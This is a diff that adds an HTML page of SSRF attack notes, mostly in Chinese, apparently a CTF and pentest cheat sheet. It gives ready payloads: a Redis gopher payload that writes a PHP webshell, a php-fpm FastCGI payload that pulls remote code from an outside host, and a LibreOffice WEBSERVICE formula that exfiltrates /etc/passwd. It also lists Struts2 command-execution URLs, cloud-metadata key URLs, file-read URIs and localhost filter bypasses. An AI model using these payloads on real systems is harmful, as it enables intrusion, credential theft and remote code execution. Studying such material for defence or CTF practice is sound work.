@@ -111,7 +111,536 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_SSRF_(Server_Side_Request_Forgery)">SSRF (Server Side Request Forgery)</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_SSRF_(Server_Side_Request_Forgery)">SSRF (Server Side Request Forgery)</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Web</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Reference">Reference</a></p>
+</li>
+<li>
+<p><a href="#page_Where">Where</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_chang_jian_can_shu_ming_cheng">常見參數名稱</a></p>
+</li>
+<li>
+<p><a href="#page_Other">Other</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_XXE">XXE</a></p>
+</li>
+<li>
+<p><a href="#page_FFMPEG_CVE_2016_189798">FFMPEG CVE-2016-1897/98</a></p>
+</li>
+<li>
+<p><a href="#page_Database_nei_jian_han_shu">Database 內建函數</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Postgresql_dblink_send_query">Postgresql dblink_send_query</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_ImageMagick_CVE_2016_3718">ImageMagick CVE-2016-3718</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_pan_duan_fang_fa">判斷方法</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_HTTP_Access_Log">HTTP Access Log</a></p>
+</li>
+<li>
+<p><a href="#page_DNS_Log">DNS Log</a></p>
+</li>
+<li>
+<p><a href="#page_fan_hui_nei_rong">返回內容</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Intranet_IP_Range">Intranet IP Range</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Payloads">Payloads</a></p>
+</li>
+<li>
+<p><a href="#page_Attacks">Attacks</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_XSPA">XSPA</a></p>
+</li>
+<li>
+<p><a href="#page_ben_de_li_yong">本地利用</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_file_protocol">file protocol</a></p>
+</li>
+<li>
+<p><a href="#page_Java_yuan_sheng_ke_lie_mu_lu">Java 原生可列目錄</a></p>
+</li>
+<li>
+<p><a href="#page_Python">Python</a></p>
+</li>
+<li>
+<p><a href="#page_PerlRuby_open_Command_Injection">Perl/Ruby open Command Injection</a></p>
+</li>
+<li>
+<p><a href="#page_Libreoffice_CVE_2018_6871">Libreoffice CVE-2018-6871</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_yuan_cheng_li_yong">遠程利用</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Protocol_men_de_shi_yong_fang_fa">Protocol 們的使用方法</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Gopher_Protocol">Gopher Protocol</a></p>
+</li>
+<li>
+<p><a href="#page_dict_Protocol">dict Protocol</a></p>
+</li>
+<li>
+<p><a href="#page_sftp_Protocol">sftp Protocol</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Struts2_s2_016_(HTTP)">Struts2 s2-016 (HTTP)</a></p>
+</li>
+<li>
+<p><a href="#page_Struts2_s2_057_(HTTP)">Struts2 s2-057 (HTTP)</a></p>
+</li>
+<li>
+<p><a href="#page_ElasticSearch_CVE_2015_3337_(HTTP)">ElasticSearch CVE-2015-3337 (HTTP)</a></p>
+</li>
+<li>
+<p><a href="#page_Cloud_Metadata_(HTTP)">Cloud Metadata (HTTP)</a></p>
+</li>
+<li>
+<p><a href="#page_Docker_API_(HTTP)">Docker API (HTTP)</a></p>
+</li>
+<li>
+<p><a href="#page_Redis_(REdis_Serialization_Protocol)">Redis (REdis Serialization Protocol)</a></p>
+</li>
+<li>
+<p><a href="#page_php_fpm_(FastCGI)">php-fpm (FastCGI)</a></p>
+</li>
+<li>
+<p><a href="#page_MySQL_(MySQL)">MySQL (MySQL)</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Bypass">Bypass</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_DNS">DNS</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_DNS_Rebinding">DNS Rebinding</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_URL">URL</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_127.0.0.1">127.0.0.1</a></p>
+</li>
+<li>
+<p><a href="#page_IPv6">IPv6</a></p>
+</li>
+<li>
+<p><a href="#page_bu_tong_jin_wei">不同進位</a></p>
+</li>
+<li>
+<p><a href="#page_Unicode_(A)_(B)_(C)_(D)">Unicode Ⓐ Ⓑ Ⓒ Ⓓ</a></p>
+</li>
+<li>
+<p><a href="#page_domain">domain</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_302_Redirect">302 Redirect</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Others">Others</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_CRLF_injection">CRLF injection</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_SMTP">SMTP</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_FingerPrint">FingerPrint</a></p>
+</li>
+<li>
+<p><a href="#page_UDP">UDP</a></p>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Web</code></h6>
+<p>利用能接觸到的伺服器，接觸到內網資源
+跟 LFI / RFI 的差別在於 SSRF 是發出 Request， LFI / RFI 是包含文件</p>
+<h1 id="page_Reference">Reference</h1>
+<p><a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit" class="Link--external" rel="noopener noreferrer">SSRF Bible</a></p>
+<h1 id="page_Where">Where</h1>
+<h2 id="page_chang_jian_can_shu_ming_cheng">常見參數名稱</h2>
+<ul>
+<li>url, link, proxy, target, host</li>
+<li>URL 預覽、分享</li>
+<li>網址上傳</li>
+<li>資源引用</li>
+</ul>
+<h2 id="page_Other">Other</h2>
+<h3 id="page_XXE">XXE</h3>
+<p>外部實體、參數實體
+參考 <a href="https://hackmd.io/@WildfootW/HkBxU2bhH" class="Link--external" rel="noopener noreferrer">XXE (XML External Entity)</a></p>
+<h3 id="page_FFMPEG_CVE_2016_189798">FFMPEG CVE-2016-1897/98</h3>
+<pre><code>#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://gg.tw/a.m3u8|file:///etc/passwd
+#EXT-X-ENDLIST
+</code></pre>
+<h3 id="page_Database_nei_jian_han_shu">Database 內建函數</h3>
+<h4 id="page_Postgresql_dblink_send_query">Postgresql dblink_send_query</h4>
+<h3 id="page_ImageMagick_CVE_2016_3718">ImageMagick CVE-2016-3718</h3>
+<ul>
+<li>可以發送 HTTP 或 FTP Request
+<ul>
+<li>payload: ssrf.mvg</li>
+</ul>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+fill 'url(http://example.com/)'
+pop graphic-context
+</code></pre>
+<ul>
+<li>
+<code>$ convert ssrf.mvg out.png</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_pan_duan_fang_fa">判斷方法</h2>
+<h3 id="page_HTTP_Access_Log">HTTP Access Log</h3>
+<p>看自己的伺服器是否有收到 Request
+有可能對方的防火牆有檔 http 對外</p>
+<h3 id="page_DNS_Log">DNS Log</h3>
+<p>大部分的防火牆不會檔 DNS 查詢</p>
+<h3 id="page_fan_hui_nei_rong">返回內容</h3>
+<p>透過 Banner, Title, Content 等資訊來辨認</p>
+<h2 id="page_Intranet_IP_Range">Intranet IP Range</h2>
+<ul>
+<li>
+<code>127.0.0.1/8</code>
+</li>
+<li>
+<code>10.0.0.0/8</code>
+</li>
+<li>
+<code>172.16.0.0/12</code>
+</li>
+<li>
+<code>192.168.0.0/16</code>
+</li>
+</ul>
+<h1 id="page_Payloads">Payloads</h1>
+<p><a href="https://github.com/cujanovic/SSRF-Testing" class="Link--external" rel="noopener noreferrer">cujanovic SSRF-Testing</a></p>
+<h1 id="page_Attacks">Attacks</h1>
+<h2 id="page_XSPA">XSPA</h2>
+<ul>
+<li>port scan
+<ul>
+<li>
+<code>127.0.0.1:80</code> =&gt; OK</li>
+<li>
+<code>127.0.0.1:87</code> =&gt; Timeout</li>
+<li>
+<code>127.0.0.1:9487</code> =&gt; Timeout</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_ben_de_li_yong">本地利用</h2>
+<p>目標可以參考 <a href="https://hackmd.io/@WildfootW/Bk_8tZ4sS" class="Link--external" rel="noopener noreferrer">LFI</a></p>
+<h3 id="page_file_protocol">file protocol</h3>
+<ul>
+<li>
+<code>file:///etc/passwd</code>
+</li>
+<li>
+<code>file://localhost/etc/passwd</code>
+</li>
+<li>
+<code>curl file://google.com/etc/passwd</code>
+<ul>
+<li>新版已修掉</li>
+<li>實測libcurl 7.47可work</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Java_yuan_sheng_ke_lie_mu_lu">Java 原生可列目錄</h3>
+<ul>
+<li>
+<code>file:///var/www/html/</code>
+</li>
+<li>
+<code>netdoc:///var/www/html/</code>
+</li>
+</ul>
+<h3 id="page_Python">Python</h3>
+<ul>
+<li>
+<code>local_file:///etc/passwd</code>
+</li>
+</ul>
+<h3 id="page_PerlRuby_open_Command_Injection">Perl/Ruby open Command Injection</h3>
+<h3 id="page_Libreoffice_CVE_2018_6871">Libreoffice CVE-2018-6871</h3>
+<ul>
+<li>可以使用<code>WEBSERVICE</code>讀本地檔案，e.g.<code>/etc/passwd</code>
+</li>
+<li>讀出來可以用http往外傳
+<ul>
+<li>
+<code>=COM.MICROSOFT.WEBSERVICE(&amp;quot;http://kaibro.tw/&amp;quot;&amp;amp;COM.MICROSOFT.WEBSERVICE(&amp;quot;/etc/passwd&amp;quot;))</code>
+</li>
+<li>e.g. DCTF 2018 final, FBCTF 2019</li>
+</ul>
+</li>
+<li>Example Payload: <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods" class="Link--external" rel="noopener noreferrer">Link</a>
+</li>
+</ul>
+<h2 id="page_yuan_cheng_li_yong">遠程利用</h2>
+<p>各個軟體支援的 protocol
+<img src="https://i.imgur.com/XIqB3zX.png" alt="" />
+各個 protocol 可以模擬的 protocol
+<img src="https://i.imgur.com/I6Y77r9.png" alt="" /></p>
+<h3 id="page_Protocol_men_de_shi_yong_fang_fa">Protocol 們的使用方法</h3>
+<h4 id="page_Gopher_Protocol">Gopher Protocol</h4>
+<ul>
+<li>模擬其他 Protocol
+<img src="https://i.imgur.com/xQw7C19.png" alt="" />
+<ul>
+<li>
+<code>%0d%0a</code> =&gt; <code>\r\n</code>
+</li>
+<li>Padding 可以是任意</li>
+</ul>
+</li>
+</ul>
+<h4 id="page_dict_Protocol">dict Protocol</h4>
+<ul>
+<li>fingerprint
+往回送 Request ，會出現目標主機使用的軟體，z.B.libcurl 7.54.0</li>
+</ul>
+<pre><code>dict://evil.com:5566
+
+$ nc -vl 5566
+Listening on [0.0.0.0] (family 0, port 5278)
+Connection from [x.x.x.x] port 5566 [tcp/*] accepted (family 2, sport 40790)
+CLIENT libcurl 7.35.0
+
+-&gt; libcurl version
+</code></pre>
+<ul>
+<li>Redis</li>
+</ul>
+<h4 id="page_sftp_Protocol">sftp Protocol</h4>
+<ul>
+<li>fingerprint</li>
+</ul>
+<pre><code>sftp://evil.com:5566
+
+$ nc -vl 5566
+Listening on [0.0.0.0] (family 0, port 5278)
+Connection from [x.x.x.x] port 5278 [tcp/*] accepted (family 2, sport 40810)
+SSH-2.0-libssh2_1.4.2
+
+-&gt; ssh version
+</code></pre>
+<h3 id="page_Struts2_s2_016_(HTTP)">Struts2 s2-016 (HTTP)</h3>
+<ul>
+<li>
+<code>action:</code>、<code>redirect:</code>、<code>redirectAction:</code>
+</li>
+</ul>
+<pre><code>http://10.0.2.87/index.do?redirect:${new java.lang.ProcessBuilder('id').start()}
+</code></pre>
+<h3 id="page_Struts2_s2_057_(HTTP)">Struts2 s2-057 (HTTP)</h3>
+<pre><code>http://10.0.2.87/$%7B233*233%7D/actionChain1.action
+</code></pre>
+<h3 id="page_ElasticSearch_CVE_2015_3337_(HTTP)">ElasticSearch CVE-2015-3337 (HTTP)</h3>
+<pre><code>http://10.0.2.87:9200/_plugin/head/../../../../etc/passwd
+</code></pre>
+<h3 id="page_Cloud_Metadata_(HTTP)">Cloud Metadata (HTTP)</h3>
+<p><a href="https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb" class="Link--external" rel="noopener noreferrer">cloud_metadata.txt</a></p>
+<pre><code>http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+</code></pre>
+<h3 id="page_Docker_API_(HTTP)">Docker API (HTTP)</h3>
+<ul>
+<li>Remote api 未授權訪問</li>
+<li>開一個container，掛載/root/，寫ssh key</li>
+<li>寫crontab彈shell</li>
+</ul>
+<h3 id="page_Redis_(REdis_Serialization_Protocol)">Redis (REdis Serialization Protocol)</h3>
+<ul>
+<li>default port: <code>6379</code>
+</li>
+<li>用 SAVE 寫 webshell</li>
+</ul>
+<pre><code>FLUSHALL 
+SET myshell &quot;&lt;?php system($_GET['cmd']) ?&gt;&quot;
+CONFIG SET DIR /www 
+CONFIG SET DBFILENAME shell.php 
+SAVE
+QUIT
+</code></pre>
+<p><code>gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT</code></p>
+<ul>
+<li>用 SAVE 寫 SSH Key</li>
+<li>用 SAVE 寫 crontab</li>
+</ul>
+<h3 id="page_php_fpm_(FastCGI)">php-fpm (FastCGI)</h3>
+<ul>
+<li>default port: 9000</li>
+<li>example
+<ul>
+<li>Discuz Pwn
+<ul>
+<li>302.php: <code>&lt;?php header( &quot;Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00&quot; );</code>
+</li>
+<li>x: <code>&lt;?php system($_GET['cmd']); ?&gt;</code>
+</li>
+<li>visit: <code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://kaibro.tw/302.php?.jpg[/img]</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_MySQL_(MySQL)">MySQL (MySQL)</h3>
+<ul>
+<li>無密碼認證可以SSRF</li>
+<li>MySQL Client與Server交互主要分兩階段
+<ul>
+<li>Connection Phase</li>
+<li>Command Phase</li>
+</ul>
+</li>
+<li>
+<code>gopher://127.0.0.1:3306/_&lt;PAYLOAD&gt;</code>
+</li>
+<li>Tool: https://github.com/undefinedd/extract0r-</li>
+</ul>
+<h1 id="page_Bypass">Bypass</h1>
+<h2 id="page_DNS">DNS</h2>
+<h3 id="page_DNS_Rebinding">DNS Rebinding</h3>
+<ul>
+<li>TTL 設很小</li>
+<li>第二次解析的時候給他內網 ip</li>
+</ul>
+<pre><code>if(validate_domain($domain)){
+    file_get_contents($domain);
+}
+</code></pre>
+<pre><code>A.54.87.54.87.1time.127.0.0.1.forever.rebind.network
+36573657.7f000001.rbndr.us
+</code></pre>
+<h2 id="page_URL">URL</h2>
+<h3 id="page_127.0.0.1">127.0.0.1</h3>
+<pre><code>127.0.0.1
+localhost
+127.0.1
+127.1
+0.0.0.0
+0.0
+0
+</code></pre>
+<h3 id="page_IPv6">IPv6</h3>
+<pre><code>::1
+::127.0.0.1
+::ffff:127.0.0.1
+::1%1
+[::]
+ip6-localhost
+</code></pre>
+<h3 id="page_bu_tong_jin_wei">不同進位</h3>
+<pre><code>2130706433 (decimal)
+0x7f000001
+017700000001
+0x7f.0x0.0x0.0x1
+0177.0.0.1
+0177.01.01.01
+0x7f.1
+</code></pre>
+<h3 id="page_Unicode_(A)_(B)_(C)_(D)">Unicode Ⓐ Ⓑ Ⓒ Ⓓ</h3>
+<pre><code>http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
+</code></pre>
+<h3 id="page_domain">domain</h3>
+<pre><code>127.0.0.1.xip.io
+foo.bar.10.0.0.1.xip.io
+</code></pre>
+<h2 id="page_302_Redirect">302 Redirect</h2>
+<ul>
+<li>用來繞過 Protocol 限制</li>
+</ul>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+Header(<span class="hljs-string">"Location: gopher://127.0.0.1:9000/x..."</span>);
+</code></pre>
+<h1 id="page_Others">Others</h1>
+<h2 id="page_CRLF_injection">CRLF injection</h2>
+<h3 id="page_SMTP">SMTP</h3>
+<p>SECCON 2017 SqlSRF:</p>
+<p><code>127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/</code></p>
+<h2 id="page_FingerPrint">FingerPrint</h2>
+<ul>
+<li>Content-Length
+<ul>
+<li>送超大Content-length</li>
+<li>連線hang住判斷是否為HTTP Service</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_UDP">UDP</h2>
+<ul>
+<li>tftp
+<ul>
+<li>
+<code>tftp://evil.com:5566/TEST</code>
+</li>
+<li>syslog</li>
+</ul>
+</li>
+</ul>
+    </div>
 
         <nav>
         <ul class="Pager">
